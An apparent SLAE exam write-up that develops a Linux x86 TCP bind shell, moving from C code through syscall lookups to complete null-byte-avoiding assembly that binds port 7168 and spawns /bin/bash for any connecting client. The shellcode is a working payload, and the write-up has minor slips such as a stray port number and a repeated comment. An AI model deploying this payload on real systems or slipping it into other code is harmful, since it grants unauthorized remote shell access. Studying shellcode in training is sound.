# SLAE Exam - Assignment 1

## Goal of the assignment:
Write shellcode that binds to a TCP port and on connection grants a shell. The port to bind to should be easily configurable.

## TCP Bind in C
Before we write the shellcode in x86 assembly we'll write the assignment in C. This makes converting into assembly a lot easier.
The following code was adapted from an example taken from https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/

```c
// Filename: tcp_bind_shell.c

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int socketfd;
int socketid;

struct sockaddr_in hostaddr;

int main() {
    // Create socket
    socketfd = socket(PF_INET, SOCK_STREAM, 0);

    // Setup struct for bind() argument
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(7168);
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to ip 0.0.0.0, port 7168
    bind(socketfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

    // Listen for incoming connections
    listen(socketfd, 2);

    // Accept incoming connection
    socketid = accept(socketfd, NULL, NULL);

    // Bind STDIN, STDOUT, STDERR to incoming connection
    dup2(socketid, 0);
    dup2(socketid, 1);
    dup2(socketid, 2);

    // Bind shell to incoming connection
    execve("/bin/bash", NULL, NULL);
}
```

In order to convert this to x86 assembly, we'll need to know which syscalls are being used. 
Specifically, we want to know the syscalls for the following functions: socket(), bind(), listen(), accept(), dup2() and execve(). 
We can look up the syscalls using https://syscalls.kernelgrok.com/. But when we look for 'socket', we don't find a syscall named "socket".
This is because socket() is part of another syscall, called "socketcall". Looking up socketcall in the [linux man pages](http://man7.org/linux/man-pages/man2/socketcall.2.html), we find 
that this syscall has the following setup:

`int socketcall(int call, unsigned long *args);`

The first argument (int call) is where we define which function to call ("socket", "bind", etc). 
The second argument is an array of arguments for the functionname specified in argument 1. 
So the function `socket(PF_INET, SOCK_STREAM, 0)` translates to `socketcall(SYS_SOCKET, [PF_INET, SOCK_STREAM, 0])`

In order to figure out what value the constant SYS_SOCKET holds, we can look them up using the following command:

```bash
dev@pc:~/SLAE/exam/ass1$ grep "SYS_SOCKET\|SYS_BIND\|SYS_LISTEN\|SYS_ACCEPT" /usr/include/linux/net.h
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

Now we know how to call socket(), we will need to know the values represented by its arguments: PF_INET and SOCK_STREAM.
These constants are defined in /usr/include/i386-linux-gnu/bits/socket.h:
```bash
dev@pc:~/SLAE/exam/ass1$ grep "PF_INET\|SOCK_STREAM" /usr/include/i386-linux-gnu/bits/socket.h 
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
#define	PF_INET		2	/* IP protocol family.  */
```

Knowing this, our function becomes ```socket(2, 1, 0)```. Lets convert that to assembly:
```asm
xor eax, eax  ; Clear EAX
mov al, 0x66  ; 0x66 is the syscall for socketcall
xor ebx, ebx  ; Clear EBX
mov bl, 0x1   ; 0x1 is SYS_SOCKET
xor edx, edx  ; Clear EDX so we have a NULL character
; Push the socket() arguments to stack in reverse order
push edx      ; Push NULL character
push byte 0x1 ; SOCK_STREAM
push byte 0x2 ; PF_INET
mov ecx, esp  ; Reference to socket() arguments
int 0x80      ; Execute syscall
mov esi, eax  ; Store the result of the syscall in ESI for laterr
```

With this knowledge we can convert the next socketcall functions as well:

### bind(socketfd, {sa_family=AF_INET, sin_port=htons(7331), sin_addr=inet_addr("0.0.0.0")}, 16)
```c
// Setup struct for bind() argument
hostaddr.sin_family = AF_INET;
hostaddr.sin_port = htons(7168);
hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

// Bind socket to ip 0.0.0.0, port 7168
bind(sockfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
```
Translated to x86 assemnly:
```asm
; bind(sockid, struct addr, len addr)
xor eax, eax    ; Clear EAX
mov al, 0x66    ; SYS_SOCKETCALL
xor ebx, ebx    ; Clear EBX
mov bl, 0x2     ; SYS_BIND
; Setup struct addr
push EDX        ; 0.0.0.0 (EDX is still all 0s)
mov byte [esp], 0x1c    ; Push first byte for port
mov byte [esp+1], dl    ; Push second byte for port
push 0x2        ; AF_INET
mov ecx, esp    ; Store ref to struct in ECX
; Setup bind arguments
push 0x10       ; Addr length (16)
push ecx        ; Struct addr
push esi        ; Ref to socketfd (which we stored in ESI earlier)
mov ecx, esp    ; Address of bind arguments
int 0x80        ; Exec syscall
```
Note: the reason we setup the port number by moving it byte-by-byte directly into the stack has to do with making the port configurable.
We pick port 7168 in this instance because when we convert this to hexadecimal, it becomes 0x1c00 which contains the NULL-byte. More about this later

### listen(socketfd, 2)
```c
listen(socketfd, 2)
```
Translated to x86 assembly:
```asm
xor eax, eax    ; Clear EAX
mov al, 0x66    ; SYS_SOCKETCALL
xor ebx, ebx    ; Clear EBX
mov bl, 0x4     ; SYS_LISTEN
push byte 0x2   ; Second argument for listen()
push esi        ; Reference to socketfd
mov ecx, esp    ; Reference to arguments
int 0x80        ; Exec syscall
```

### accept(socketfd, null, null)
```c
socketid = accept(socketfd, null, null)
```
Translated to x86 assembly:
```asm
xor eax, eax    ; Clear EAX
mov al, 0x66    ; SYS_SOCKETCALL
xor ebx, ebx    ; Clear EBX
mov bl, 0x5     ; SYS_ACCEPT
push edx        ; 3rd argument NULL (EDX is still NULL)
push edx        ; 2nd argument NULL
push esi        ; 1st argument, reference to socketfd
int 0x80        ; Exec syscall
```

### dup2(socketid, 1/2/3)
Now that we've done all the "socketcall" functions, let's see what we need for syscall dup2:
```bash
dev@pc:~/SLAE/exam/ass1$ grep "dup2" /usr/include/i386-linux-gnu/asm/unistd_32.h 
#define __NR_dup2		 63
```
Because we need to call this function 3 times, and only the second argument (ECX) changes, we don't need to setup everything for 
all 3 calls. We do need the reference to socketid here, which is currently in EAX. Let's move that to EBX first before continuing
```asm
mov ebx, eax      ; Reference to socketid
xor eax, eax      ; Clear EAX
mov al, 0x3f      ; SYS_DUP2
xor ecx, ecx      ; ECX is now 0
int 0x80          ; Exec syscall
```

The result of the syscall was put in EAX, so we need to setup that one again. 
EBX is still correct, and ECX just needs to increment to have the correct next value
```asm
xor eax, eax      ; Clear EAX
mov eax, 0x3f     ; SYS_DUP2
inc ecx           ; ECX is now 1
int 0x80          ; Exec syscall

; And the same again for the 3rd function
xor eax, eax      ; Clear EAX
mov eax, 0x3f     ; SYS_DUP2
inc ecx           ; ECX is now 1
int 0x80          ; Exec syscall
```

### execve("/bin/bash", NULL, NULL)
Now we only need to translate the last execve function:
```c
execve("////bin/bash", NULL, NULL)
```
Translated to x86 assembly:
```asm
xor eax, eax      ; Clear EAX
mov al, 0x0b      ; SYS_EXECVE
push edx          ; Push NULL character to stack (EDX is still NULL)
push 0x68736162   ; "hsab"
push 0x2f6e6962   ; "/nib"
push 0x2f2f2f2f   ; "////"
mov ebx, esp      ; Reference to "////bin/bash" on stack
xor ecx, ecx      ; 2nd argument NULL
int 0x80          ; Exec syscall
```

Now our full translated x86 code should look like this:
```asm
section .text
global main

main:
    xor edx, edx    ; Zero-out EDX for later use
    ; sockfd = socket(PF_INET, SOCK_STREAM, 0)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x1     ; SYS_SOCKET
    push edx        ; 3rd argument 0
    push byte 0x1   ; 2nd argument SOCK_STREAM
    push byte 0x2   ; 1st argument PF_INET
    mov ecx, esp    ; Address of socket arguments
    int 0x80        ; Exec syscall

    ; We need the result later
    mov esi, eax    ; Store ref to sockfd in ESI

    ; bind(sockid, struct addr, len addr)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x2     ; SYS_BIND
    ; Setup struct addr
    push edx        ; 0.0.0.0
    mov byte [esp], 0x1c    ; Push first byte for port
    mov byte [esp+1], dl    ; Push second byte for port
    push 0x2        ; AF_INET
    mov ecx, esp    ; Store struct in ECX
    ; Setup bind arguments
    push 0x10       ; Addr length (16)
    push ecx        ; Struct addr
    push esi        ; Ref to sockfd
    mov ecx, esp    ; Address of bind arguments
    int 0x80        ; Exec syscall

    ; listen(sockid, 2)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x4     ; SYS_LISTEN
    ; Setup arguments
    push byte 0x2   ; 2
    push esi        ; Ref to sockid
    mov ecx, esp    ; Address of listen arguments
    int 0x80        ; Exec syscall

    ; socketid = accept(sockfd, null, null)
    mov eax, edx    ; Zero-out EAX
    mov ebx, edx    ; Zero-out EBX
    mov al, 0x66    ; SYS_SOCKETCALL
    mov bl, 0x5     ; SYS_ACCEPT
    push edx        ; NULL
    push edx        ; 0
    push esi        ; Ref to sockid
    mov ecx, esp    ; Address of arguments
    int 0x80

    ; dup2(socketid, 0)
    mov ebx, eax    ; Ref to socketid
    xor eax, eax    ; Zero-out EAX
    xor ecx, ecx    ; Zero-out ECX
    mov al, 0x3f    ; SYS_DUP2
    int 0x80        ; Exec syscall
    ; dup2(socketid, 1)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x3f    ; SYS_DUP2
    inc ecx         ; 1
    int 0x80        ; Exec syscall
    ;dup2(socketid, 2)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x3f    ; SYS_DUP2
    inc ecx         ; 2
    int 0x80        ; Exec syscall

    ; execve("////bin/bash", NULL, NULL)
    xor eax, eax    ; Zero-out EAX
    mov al, 0x0b    ; SYS_EXECVE
    push edx        ; NULL-character on stack
    push 0x68736162 ; "hsab"
    push 0x2f6e6962 ; "/nib"
    push 0x2f2f2f2f ; "////"
    mov ebx, esp    ; Ref to "////bin/bash" from stack
    mov ecx, edx    ; NULL
    int 0x80
```




